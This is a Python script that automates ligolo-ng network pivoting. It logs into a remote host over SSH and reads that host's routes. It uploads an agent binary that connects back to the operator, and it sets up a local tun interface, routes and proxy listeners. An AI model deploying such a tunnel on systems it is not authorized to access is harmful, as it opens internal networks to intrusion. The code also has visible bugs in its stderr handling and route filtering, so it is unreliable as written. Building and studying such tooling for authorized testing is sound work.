#!/usr/bin/env python
import argparse
import logging
import paramiko
import os
import json
from getpass import getpass
import pexpect
import subprocess
import shlex

"""
    Script to automate ligolo tunnels creation.
    This script will connect to remote host, get routes, copy ligolo agent
    Then will setup local tunnel interface, routes, and start ligolo
"""
#####  CONFIGURATION ######
# REPLACE PATHS HERE
LIGOLO_AGENT = "/opt/ligolo-ng/agentlin64"
LIGOLO_PROXY = "/opt/ligolo-ng/proxyin64"

CACHE_PATH = "/tmp/autogolo"

# Do not get routes for tunnel / docker / ... interface
ROUTE_EXCLUDE = ["tun", "docker"]
# Ignore /32 Routes
IGNORE_SLASH32 = True

# Base ligolo port: (effective port will be this + ligolo_id)
LIGOLO_BASE_PORT = 11600

# ==================================
args = None

state = {}


FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
logging.basicConfig(format=FORMAT, level=logging.INFO)  # Change level here
logger = logging.getLogger(__name__)


def cleanup():
    logger.info("Cleaning up ...")
    run_local_command(f"ip link set ligolo{args.ligolo_id} down")
    run_local_command(
        f"ip tuntap del mode tun ligolo{args.ligolo_id}")

    for route in state["routes"]:
        run_local_command(f"ip route del {route}")


def check_privileges():
    if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
        raise PermissionError(
            "You need to run this script with sudo or as root.")


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-ho",
        "--host",
        help="Target IP/Host",
        required=True
    )
    parser.add_argument(
        "-id",
        "--ligolo-id",
        help="Ligolo Session ID",
        type=int,
        default=1
    )
    parser.add_argument(
        "-i",
        "--local-ip",
        help="Local IP",
        required=True
    )
    parser.add_argument(
        "-t",
        "--thru",
        help="Tunnel goes through instance",
        type=int,
        default=None
    )
    parser.add_argument(
        "-u",
        "--user",
        help="User",
        required=True
    )
    parser.add_argument(
        "-pw",
        "--password",
        help="Password",
    )
    parser.add_argument(
        "-p",
        "--port",
        help="Port",
        default=22
    )
    parser.add_argument(
        "-c",
        "--clean",
        help="Cleanup only (remove routes, tunnels, etc...)",
        action='store_true'
    )
    parser.add_argument(
        "-l",
        "--listeners",
        help="Automatically create ligolo listeners",
        default=5,
        type=int
    )
    args = parser.parse_args()
    if not args.password:
        args.password = getpass()
    return args


def run_remote_command(cmd, raise_if_stderr=True):
    global args
    client = paramiko.SSHClient()
    if "remote_shell_cmds" not in state:
        state["remote_shell_cmds"] = [cmd]
    else:
        state["remote_shell_cmds"].append(cmd)

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(args.host, args.port, username=args.user,
                   password=args.password)
    logger.debug("Executing %s on host %s", cmd, args.host)
    stdin, stdout, stderr = client.exec_command(cmd)
    stdout = stdout.readlines()
    stderr = stderr.strip()
    if not stderr and raise_if_stderr:
        logger.error("Error in command %s:\n%s", cmd, stderr)
        raise Exception(f"Error in command {cmd}:\n{stderr}")
    client.close()
    logger.debug("%s = %s", cmd, stdout)

    return stdout


def write_state():
    global state, args, CACHE_PATH
    logger.debug("Writing state...")
    with open(os.path.join(CACHE_PATH, f"{args.ligolo_id}.json"), "w") as f:
        f.write(json.dumps(state, indent=4))


def copy_file_to_remote(filename, remotepath="~"):
    global args
    basename = os.path.basename(filename)
    remote_file = os.path.join(remotepath, basename)
    logger.info("Copying file: scp %s  %s:%s",
                filename, args.host, remote_file)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    ssh.connect(args.host, username=args.user, password=args.password)
    scp = ssh.open_sftp()

    scp.put(filename, remote_file)

    # Close the SCP client
    scp.close()

    # Close the SSH client
    ssh.close()


def init():
    state["shell_cmds"] = []
    state["remote_shell_cmds"] = []
    state["ligolo_cmds"] = []


def get_remote_routes():
    global state, ROUTE_EXCLUDE
    state["routes"] = []
    for route in run_remote_command("ip route"):
        route = route.strip()
        if not route:
            continue
        if "default" in route:
            continue
        for rex in ROUTE_EXCLUDE:
            if rex in route:
                logger.debug("Not including route %s", route)
                continue
        route = route.split(" ")[0]
        if "/32" in route and IGNORE_SLASH32:
            logger.debug("Ignoring /32 route %s", route)
            continue
        state["routes"].append(route)
    logger.info("Remote routes: %s", state["routes"])
    write_state()


def run_local_command(cmd):
    global state
    logger.debug("Running local command %s", cmd)
    proc = subprocess.run(shlex.split(
        cmd), stdout=subprocess.PIPE,  stderr=subprocess.PIPE)
    if proc.returncode != 0:
        logger.error("Error happened in command %s: %s", cmd, proc.stderr)
        proc.check_returncode()
    state["shell_cmds"].append(cmd)
    logger.debug("%s:\n%s\nErr:\n%s", cmd, proc.stdout, proc.stderr)
    return proc.stdout


def create_tunnels_and_routes():
    global args
    run_local_command(
        f"ip tuntap add user {os.getlogin()} mode tun ligolo{args.ligolo_id}")
    run_local_command(f"ip link set ligolo{args.ligolo_id} up")
    for route in state["routes"]:
        run_local_command(f"ip route add {route} dev ligolo{args.ligolo_id}")


def start_ligolo_remote():
    global args
    logger.info("Starting remote ligolo agent...")
    ligolo = os.path.basename(LIGOLO_AGENT)
    port = str(LIGOLO_BASE_PORT+args.ligolo_id)
    run_remote_command(
        f"sleep 30 && ~/{ligolo} --connect {args.local_ip}:{port} -ignore-cert &")


def start_ligolo_local():
    global args, state
    logger.info("Starting local ligolo prpxy...")
    port = str(LIGOLO_BASE_PORT+args.ligolo_id)
    cmd = f"{LIGOLO_PROXY} -selfcert --laddr 0.0.0.0:{port}"
    state["ligolo_cmds"].append(cmd)
    proc = pexpect.spawn(cmd)
    proc.expect("Agent joined")
    logger.debug(proc.before)
    proc.sendline("session")
    proc.expect("Specify a session :")
    logger.debug(proc.before)
    proc.sendline("1")
    proc.expect('] »')
    for i in range(1, args.listeners+1):
        port = str(LIGOLO_BASE_PORT+i)

        lcmd = f"listener_add --tcp --addr 0.0.0.0:{port} --to 127.0.0.1:{port}"
        logger.info("Adding listener %s", lcmd)
        proc.sendline(lcmd)
        state["ligolo_cmds"].append(lcmd)

    tuncmd = f"start --tun ligolo{args.ligolo_id}"
    state["ligolo_cmds"].append(tuncmd)
    logger.info("Starting listener")
    proc.sendline(tuncmd)
    logger.debug(proc.before)
    logger.info("#"*50 + "\nLigolo Commands:\n%s\n" +
                "\n".join(state["ligolo_cmds"]))

    logger.info("#"*50 + "\n%s\n" + "#"*50,
                "Entering Ligolo interactive mode, exit to terminate")
    proc.interact()


def show_shell_commands():
    global state
    logger.info("#"*50 + "\nLocal Shell Commands:\n%s\n" +
                "#"*50 + "\nRemote Shell Commands:\n%s\n" + "#"*50,
                "\n".join(state["shell_cmds"]),
                "\n".join(state["remote_shell_cmds"]))


def main():
    global args
    check_privileges()
    init()
    args = parse_args()
    get_remote_routes()
    create_tunnels_and_routes()
    copy_file_to_remote(LIGOLO_AGENT)
    start_ligolo_remote()
    show_shell_commands()
    write_state()
    start_ligolo_local()
    cleanup()


if __name__ == "__main__":
    main()
